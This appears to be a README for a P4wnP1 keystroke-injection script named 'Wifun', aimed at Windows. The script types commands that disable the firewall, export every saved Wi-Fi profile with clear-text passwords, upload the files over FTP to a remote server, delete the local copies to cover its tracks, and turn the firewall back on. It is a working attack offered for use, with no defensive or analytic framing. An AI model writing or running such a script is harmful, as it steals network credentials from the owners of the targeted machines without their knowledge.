# Wifun
This script has been written in javascript adapted to P4wnP1 language in order to be ran in a Windows desktop environment

# Script
```js
layout('es');                   // Spanish keyboard layout
typingSpeed(100,150)    // Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)

delay(2000)
press("ESC")
delay(400)
type("cmd")
delay(400)
delay(400)
type("netsh firewall set opmode mode=disable")
press("ENTER")
delay(400)
type("netsh wlan export profile key=clear")
press("ENTER")
delay(400)
type("cd %USERPROFILE%")
press("ENTER")
delay(400)
type("ftp -i ftp server")
press("ENTER")
delay(400)
type("username")
press("ENTER")
delay(400)
type("password")
press("ENTER")
delay(600)
type("prompt")
press("ENTER")
delay(400)
type("prompt")
press("ENTER")
delay(400)
type("MPUT *.xml")
press("ENTER")
delay(4000)
type("bye")
press("ENTER")
delay(400)
type("del *.xml")
press("ENTER")
delay(200)
type("netsh firewall set opmode mode=enable")
press("ENTER")
delay(400)
type("c")
```
